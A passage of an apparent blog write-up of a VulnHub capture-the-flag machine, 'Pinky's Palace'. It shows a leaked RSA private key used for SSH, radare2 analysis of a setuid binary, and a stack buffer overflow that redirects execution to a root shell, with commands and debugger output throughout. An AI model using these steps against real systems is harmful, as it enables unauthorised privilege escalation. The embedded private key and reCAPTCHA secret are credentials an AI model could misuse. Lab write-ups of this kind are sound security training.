+K2vbVNBqEBCP+xrC5dHOBIEWv89BFIm/Fs/esh8uE5Lnj11eP+1EZh2FK92Qx9Yv
+y1bMsAkf+ptFUJLck1M20efAaSvOhr5uajnyqCofsSUfKZaa7nPQozepqMKXGMoy
+MEEeLOw56sJhSp0UdXyaz9FQAmvzSXUnuo1t+gMCgYEAubx42WkCpSC9XkeOyFhg
+YGsLN9UIOi9kpRAnOlxB3aD6FF494dlNZhR/lkgM9s1YOfRXIhVm0ZQCs8pPEVdA
+Hx18r/2EBaWhzkZzlayr/qGooQppRFmmJ3j6ryfBomQo5+H62TA7mIuwt1oXL6c6
+/a63FqPang2VFjfcc/r+6qECgYA+AzrfHFKzhWNCV9cudjp1sMtCOEYXKD1i+Rwh
+Y6O85+Og8i2RdB5EkyvJkuwpv8Cf3OQowZinbq+vG0gMzsC9JNxItZ4sS+OOT+Cw
+3lsKx+asC2Vx7PiKt8uEbUNvDrOXxPjuRImMhX3YSQ/UAsBGRZXl050UKmoeTIKh
+ShiOVQKBgQDsS41imCxW2me541vtwAaIpQ5lo5OVzD2A9teEPsU6F2h6X7pWR6IX
+A9rpLWmbfxGgJ0MVhxCjpeYgSC8UsdMzNa2ApcwOWQekNE4eLtO7Zv2SVDr6cIrc
+HccEP+MGM2eUfBPnkaPkbCPr7tnqPf8eJqiQUkWVh2CnYzeAHr5OmA==
+-----END RSA PRIVATE KEY-----
+</code></pre><p>Having that file saved in <code>pinky.rsa</code> file there was nothing more to do than try to connect as <code>pinky</code> user.</p>
+<pre><code>foxtrotc@raptor:~ $ ssh pinky@192.168.88.242 -i pinky.rsa -p 64666
+</code></pre><p>Ok, I&rsquo;m in.</p>
+<pre><code>pinky@pinkys-palace:~$ ls
+adminhelper  note.txt
+</code></pre><p>These two files are available on that account in ~ directory. The note says:</p>
+<pre><code>Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(
+</code></pre><p>Let&rsquo;s look what this utility does:</p>
+<pre><code>pinky@pinkys-palace:~$ ./adminhelper whoami
+whoami
+pinky@pinkys-palace:~$ ./adminhelper AAAAAA[...]AAAAAAAAAAAAAAAa
+AAAA[...]AAAAAAAAa
+Segmentation fault
+</code></pre><p>Ou! That&rsquo;s interesting!</p>
+<p>Let&rsquo;s see what can be achieved by exploiting this buffer overflow:</p>
+<pre><code>pinky@pinkys-palace:~$ ls -la
+total 44
+drwx------ 3 pinky pinky 4096 Jul 24 18:10 .
+drwxr-xr-x 4 root  root  4096 Feb  2 03:59 ..
+-rwsr-xr-x 1 root  root  8880 Feb  2 02:03 adminhelper
+</code></pre><p>Ok, so it seems that this adminhelper is using <code>sticky bit</code> (#toldyouso). If I&rsquo;m able to axploit this vuln and spawn the shell or cat flag file - the challenge will be done!</p>
+<h6 id="0x0303-shell-via-the-binary---buffer-overflow">0x03.03 Shell via the binary - buffer overflow<a href="#0x0303-shell-via-the-binary---buffer-overflow" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h6>
+<p>Providing a long string that causes segmentation fault may be the indicator of the potentially exploitable buffer overflow error. I&rsquo;ve downloaded this binary from the remote VM to my local hacking machine to investigate the problem in radare2.</p>
+<pre><code>foxtrotc@raptor:~ $ scp -P 64666 -i pinky.rsa pinky@192.168.88.242:/home/pinky/adminhelper .
+</code></pre><p>What&rsquo;s more, the ASLR was disabled on target system:</p>
+<pre><code>pinky@pinkys-palace:~$ cat /proc/sys/kernel/randomize_va_space
+0
+</code></pre><p>And the NX bit on this binary (also stack canary) are disabled:</p>
+<pre><code>canary   false
+[..]
+nx       false
+</code></pre><p>That will make pwning this program much much easier.</p>
+<p><sub><sup>
+Sidenote: During pentest engagement I would use some exploit suggester since it&rsquo;s automated and easy thing to do in the background. I could download and use it, but I want to solve <code>Pinkys Palace I</code> the way it was designed to pwn - the privileges escalation is trivial here, no need to shoot this VM with <a href="https://en.wikipedia.org/wiki/Grom_(missile)">GROM</a> - the Polish SAM missile ;).
+</sup></sub></p>
+<p>Investigating <code>adminhelper</code> with <code>radare2</code> shows some interesting functions in use. For example <code>strcpy</code> which may lead to buffer overflow error.</p>
+<pre><code><pre><code class="language-radare2" data-lang="radare2">[0x000006a0]&gt; afl
+[...]
+0x00000640    1 6            sym.imp.strcpy
+0x00000650    1 6            sym.imp.puts
+0x00000660    1 6            sym.imp.execve
+0x00000670    1 6            sym.imp.setegid
+0x00000680    1 6            sym.imp.seteuid
+[...]
+0x000007d0    1 67           sym.spawn
+0x00000813    3 66           sym.main</code></pre>
+</code></pre><p>The graph view of main function looks like this:</p>
+<pre><code>[0x00000813]&gt; VV @ sym.main (nodes 3 edges 3 zoom 100%) 
+
+BB-NORM mouse:canvas-y mov-speed:5
+╭──────────────────────────────────────────╮
+│  0x813                                   │
+│ ;-- main:                                │
+│ (fcn) sym.main 66                        │
+│   sym.main (char **arg1, char **arg2);   │
+│ ; var char **src @ rbp-0x50              │
+│ ; var unsigned int local_44h @ rbp-0x44  │
+│ ; var char *dest @ rbp-0x40              │
+│ ; STRING XREF from 0x000006bd (entry0)   │
+│ push rbp                                 │
+│ rbp = rsp                                │
+│ ; 'P'                                    │
+│ rsp -= 0x50                              │
+│ ; arg1                                   │
+│ dword [local_44h] = edi                  │
+│ ; arg2                                   │
+│ qword [src] = rsi                        │
+│ ; [0x2:4]=0x102464c                      │
+│ var = dword [local_44h] - 2              │
+│ if (var) goto 0x84e;[ga]                 │
+╰──────────────────────────────────────────╯
+        │ │
+        │ ╰────────────────────╮
+     ╭──╯                      │
+     │                         │
+     │                         │
+ ╭─────────────────────────╮   │
+ │  0x828                  │   │
+ │ rax = qword [src]       │   │
+ │ rax += 8                │   │
+ │ rdx = qword [rax]       │   │
+ │ rax = [dest]            │   │
+ │ ; const char *src       │   │
+ │ rsi = rdx               │   │
+ │ ; char *dest            │   │
+ │ rdi = rax               │   │
+ │ sym.imp.strcpy ();[gb]  │   │
+ │ rax = [dest]            │   │
+ │ ; const char *s         │   │
+ │ rdi = rax               │   │
+ │ sym.imp.puts ();[gc]    │   │
+ ╰─────────────────────────╯   │
+     │                         │
+     ╰─╮ ╭─────────────────────╯
+       │ │
+       │ │
+ ╭────────────────────────────────────────╮
+ │  0x84e                                 │
+ │ ; CODE XREF from 0x00000826 (sym.main) │
+ │ eax = 0                                │
+ │                                        │
+ │ return 0                               │
+ ╰────────────────────────────────────────╯
+</code></pre><p>This short function decompiled by awesome plugin - <code>r2dec</code> looks like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+[<span style="color:#ae81ff">0x000006a0</span>]<span style="color:#f92672">&gt;</span> pdd <span style="color:#960050;background-color:#1e0010">@</span> sym.main 
+<span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>int64_t main () {
+    <span style="color:#75715e">/* arg1 */</span>
+    <span style="color:#f92672">*</span>(local_44h) <span style="color:#f92672">=</span> edi;
+    <span style="color:#75715e">/* arg2 */</span>
+    <span style="color:#f92672">*</span>(src) <span style="color:#f92672">=</span> rsi;
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>(local_44h) <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+        rax <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(src);
+        rax <span style="color:#f92672">+=</span> <span style="color:#ae81ff">8</span>;
+        <span style="color:#75715e">/* crtstuff.c */</span>
+        rdx <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(rax);
+        rax <span style="color:#f92672">=</span> dest;
+        <span style="color:#75715e">/* const char *src */</span>
+        rsi <span style="color:#f92672">=</span> rdx;
+        <span style="color:#75715e">/* char *dest */</span>
+        rdi <span style="color:#f92672">=</span> rax;
+        strcpy (rdi, rsi);
+        rax <span style="color:#f92672">=</span> dest;
+        <span style="color:#75715e">/* const char *s */</span>
+        rdi <span style="color:#f92672">=</span> rax;
+        puts (rdi);
+    }
+    eax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#66d9ef">return</span> rax;
+}
+</code></pre></div><p><sub><sup> If you are interested in r2dec plugin, I would recommend pretty clear introduction by Paweł Łukasik from <a href="https://youtu.be/zc8AC5LWvOU">here</a> </sub></sup></p>
+<p>There is also another function, that is worth mentioning. As author note said, this program is designed to spawn the shell, let&rsquo;s look at the <code>sym.spawn</code> function in r2:</p>
+<pre><code>[0x000007d0]&gt; VV @ sym.spawn (nodes 1 edges 0 zoom 100%) 
+
+BB-NORM mouse:canvas-y mov-speed:5
+╭───────────────────────────────╮
+│  0x7d0                        │
+│ (fcn) sym.spawn 67            │
+│   sym.spawn ();               │
+│ ; var int local_8h @ rbp-0x8  │
+│ ; var int local_4h @ rbp-0x4  │
+│ push rbp                      │
+│ rbp = rsp                     │
+│ rsp -= 0x10                   │
+│ dword [local_4h] = 0          │
+│ dword [local_8h] = 0          │
+│ eax = dword [local_4h]        │
+│ edi = eax                     │
+│ sym.imp.seteuid ();[ga]       │
+│ eax = dword [local_8h]        │
+│ edi = eax                     │
+│ sym.imp.setegid ();[gb]       │
+│ edx = 0                       │
+│ esi = 0                       │
+│ ; 0x8e4                       │
+│ ; &quot;/bin/sh&quot;                   │
+│ rdi = str.bin_sh              │
+│ sym.imp.execve ();[gc]        │
+│                               │
+│ leave                         │
+│ return                        │
+╰───────────────────────────────╯
+</code></pre><p>And C version:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">[<span style="color:#ae81ff">0x000006a0</span>]<span style="color:#f92672">&gt;</span> pdd <span style="color:#960050;background-color:#1e0010">@</span> sym.spawn 
+int32_t spawn () {
+    <span style="color:#f92672">*</span>(local_4h) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    <span style="color:#f92672">*</span>(local_8h) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    eax <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(local_4h);
+    edi <span style="color:#f92672">=</span> eax;
+    seteuid (edi);
+    eax <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(local_8h);
+    edi <span style="color:#f92672">=</span> eax;
+    setegid (edi);
+    edx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    esi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+    execve (<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, esi, edx);
+    <span style="color:#66d9ef">return</span> eax;
+}
+</code></pre></div><p>That&rsquo;s cute.</p>
+<p>It&rsquo;s time to exploit this vuln by simply pointing RIP to the <code>sym.spawn</code> function. To do this, I&rsquo;ve tried to determine the length of overflowing buffer. It can be done by De Bruijn Patterns and <code>ragg2</code>.</p>
+<p>Or this way:</p>
+<p><img src="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif" alt="or this way"></p>
+<p><sub><sup> <a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/">source</a> </sup></sub></p>
+<p>This time without <code>ragg2</code>:</p>
+<pre><code>Starting program: /home/pinky/adminhelper AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBCCCC
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000434343434242 in ?? ()
+</code></pre><p>Look at the <code>RIP</code> register. It&rsquo;s time to craft the &ldquo;exploit&rdquo;. I&rsquo;m not a perl guy, but it&rsquo;s the language that was used in <strong>&ldquo;The Art of Exploitation&rdquo;</strong> by John Erickson, and I will use it here :)</p>
+<p>So input string is the length of 78. The address of target function is <code>0x00005555555547d0</code>,I need 72 chars of random padding and the 6 bytes of address in little endian <code>\xd0\x47\x55\x55\x55\x55</code>. Now it&rsquo;s time to combine the padding with the address of that function and we are done! (well, probably)</p>
+<p>The exploitation string looks like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl">
+</code></pre></div><p>The padding will overflow the buffer and <code>0x00005555555547d0</code> will become the return address of <code>strcpy</code> that will be placed in instruction pointer when program will try to return from function. Then the execution will continue at this new, injected address which is the place in memory where shell spawning function is placed.</p>
+<p>And after running the <code>adminhelper</code> with perl&rsquo;s output the machine is compromised!</p>
+<pre><code>pinky@pinkys-palace:~$ ./adminhelper `cat file.txt`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�GUUUU
+# cat /root/root.txt
+===========[!!!CONGRATS!!!]===========
+
+[+] You r00ted Pinky's Palace Intermediate!
+[+] I hope you enjoyed this box!
+[+] Cheers to VulnHub!
+[+] Twitter: @Pink_P4nther
+
+Flag: 99975cfc5e2eb4c199d38d4a2b2c03ce
+# whoami
+root
+</code></pre><p>The flag is <strong>99975cfc5e2eb4c199d38d4a2b2c03ce</strong>. I&rsquo;ve checked this on the crackstation, but no luck. It seems that&rsquo;s the end!</p>
+<p><img src="https://foxtrotlabs.cc/pics/HVMPPI2018EN/flag.png" alt="flag"></p>
+<h3 id="wrapping-it-up">Wrapping it up<a href="#wrapping-it-up" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>This challenge was fun! It seems like this strange hash is the solution. So thank you @Pink_P4nther for your challenge. I&rsquo;m looking forward to pwning other machines on VulnHub in my free time.</p>
+<p>This privilege exploitation could be worse with ASLR and NX. But this time no NOP sleds or ROP was needed.</p>
+<p>Ok, so that&rsquo;s all for today. If you have any comments/protips or questions you can find me on IRC(foxtrot_charlie on freenode)/twitter or via en email listed on <code>whoami</code> page. Now I have to focus on post that describes easy radare2 plugin development.</p>
+<p>See you on the Internet!</p>
+<p>foxtrot_charlie over and out</p>
+
+      </div></div>
+
+  
+
+  
+
+<link rel="stylesheet" href="https://foxtrotlabs.cc/comments.css">
+ <section class="post-comments">
+  <script src='https://www.google.com/recaptcha/api.js'></script>
+  <h3>Comments</h3>
+
+  
+  
+  
+
+  
+    
+  
+
+  
+    <p>Nothing yet.</p>
+  
+
+  <h3>Say something</h3>
+
+  <form class="post-new-comment" method="POST" action="https://flabs-staticman.herokuapp.com/v2/entry/s3gm3nt4ti0nf4ult/s3gm3nt4ti0nf4ult.github.io/master/comments">
+  
+    <input type="hidden" name="options[redirect]" value="https://foxtrotlabs.cc/2018/07/en-hacking-vulnhub-machine-pinkys-palace-i/#comment-submitted">
+    <input type="hidden" name="options[entryId]" value="7e22f5038aeade7d997f9619a415afff">
+    <input name="fields[name]" type="text" class="post-comment-field" placeholder="Your name">
+    <input name="fields[email]" type="email" class="post-comment-field" placeholder="Your email address">
+    <textarea name="fields[body]" class="post-comment-field" placeholder="Your message. Feel free to use Markdown." rows="10"></textarea>
+    <input type="hidden" name="options[reCaptcha][siteKey]" value="6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR">
+    <input type="hidden" name="options[reCaptcha][secret]" value="LIrSDvvGlpdtRj5u1ERCiGLqhTgNVgs9kQoezb44tjrr83UiTbPCaem4CyKSxgXmkdI5CCOyheyPHa7PpZI7na9ZfI/RP4CYyHEj2TF2LdoVJ8ZclSuQiDw5h5SbgWNmKTOGODDwnEVQfy3dU0wZOKXYwUXqgKmW+wI49+Yz27DsHwe3UD+AclUnacU/A58F21iFPwcSaOkfxPz5Jz0mVk+8U25k/jO4LVAHB4/Uji6pBD9UT0H+9YzhsakPn5Cuak5FepB4+wxytndygr4X2YJSa+RMZCGBDqApqrinKRcDsq3CLmno8EfjJ4878iEaLeje4HAlgCjEdaY0GDBG7g==">
+    <div class="g-recaptcha" data-sitekey="6Lco6bkZAAAAAPwhdzJftINmETZymWpv1s8w1hKR"></div>
+    <input type="submit" class="post-comment-field btn" value="Submit">
+  </form>
+</section>
+
+<div id="comment-submitted" class="dialog">
+<h3>Thank you</h3>
+  <p>Your comment has been submitted and will be published once it has been approved.</p>
+  <p><a href="#" class="btn">OK</a></p>
+</div>
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>copyright by foxtrot_charlie</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://foxtrotlabs.cc/assets/main.js"></script>
+<script src="https://foxtrotlabs.cc/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
